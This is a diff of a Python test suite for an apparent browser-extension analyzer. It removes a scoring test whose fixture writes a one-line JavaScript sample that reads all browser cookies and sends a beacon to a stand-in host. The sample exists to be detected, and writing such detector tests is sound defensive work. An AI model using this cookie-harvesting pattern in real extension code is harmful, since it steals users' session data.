@@ -199,18 +199,3 @@ class TestCodeReviewScoring:
         a = aggregate(_clean_tpci(), _clean_sentry(), _clean_liveness(), _empty_pa())
         b = aggregate(_clean_tpci(), _clean_sentry(), _clean_liveness(), _empty_pa(), code_review=None)
         assert a.score == b.score
-
-    def test_not_double_counted_when_deep_ran(self, tmp_path):
-        from types import SimpleNamespace
-
-        from extanalyze.analysis.code_review import review_directory
-
-        (tmp_path / "a.js").write_text("chrome.cookies.getAll({});navigator.sendBeacon('https://a.test');")
-        cr = review_directory(tmp_path, ["a.js"])
-        deep = SimpleNamespace(total_score=0, findings=[], retire_js=[])
-        base = aggregate(_clean_tpci(), _clean_sentry(), _clean_liveness(), _empty_pa(), deep_result=deep)
-        both = aggregate(
-            _clean_tpci(), _clean_sentry(), _clean_liveness(), _empty_pa(),
-            deep_result=deep, code_review=cr,
-        )
-        assert both.score == base.score
